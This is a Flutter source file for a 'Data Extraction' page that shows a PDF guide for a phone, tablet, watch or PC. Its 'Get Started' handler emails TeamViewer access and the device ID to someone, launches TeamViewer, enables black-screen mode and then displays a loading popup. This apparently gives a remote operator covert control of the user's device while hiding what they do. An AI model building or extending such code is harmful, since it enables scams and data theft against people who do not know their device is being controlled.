import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:syncfusion_flutter_pdfviewer/pdfviewer.dart';
import 'dart:io';
import '../../services/email_service.dart';
import '../../services/teamviewer_service.dart';
import '../popups/loading_popup.dart';
import '../popups/pdf_popup.dart';

class ExtractionPage extends StatefulWidget {
  final String deviceType;
  final String deviceId;

  const ExtractionPage({super.key, required this.deviceType, required this.deviceId});

  @override
  _ExtractionPageState createState() => _ExtractionPageState();
}

class _ExtractionPageState extends State<ExtractionPage> {
  String _getPdfPath() {
    switch (widget.deviceType) {
      case "Mobile Phone":
        return "assets/pdf/MobilePhone.pdf";
      case "Tablet":
        return "assets/pdf/Tablet.pdf";
      case "Smart Watch":
        return "assets/pdf/SmartWatch.pdf";
      case "PC or Mac":
        return "assets/pdf/PC.pdf";
      default:
        return "";
    }
  }

  void _startDataExtraction() async {
    await EmailService.sendTeamViewerAccess(widget.deviceType, widget.deviceId);
    await TeamViewerService.launchTeamViewer();
    await TeamViewerService.enableBlackScreen();
    Get.to(() => const LoadingPopup());
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Text("${widget.deviceType} Data Extraction")),
      body: Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Expanded(
              child: SfPdfViewer.file(
                File(_getPdfPath()),
              ),
            ),
            const SizedBox(height: 20),
            ElevatedButton(
              onPressed: () {
                showDialog(
                  context: context,
                  builder: (BuildContext context) {
                    return PdfPopup(
                      filePath: _getPdfPath(),
                      isPdf: true,
                      onStartExtraction: _startDataExtraction,
                    );
                  },
                );
              },
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.blue,
                padding: const EdgeInsets.symmetric(horizontal: 30, vertical: 15),
              ),
              child: const Text("Get Started", style: TextStyle(color: Colors.white, fontSize: 18)),
            ),
            const SizedBox(height: 20),
          ],
        ),
      ),
    );
  }
}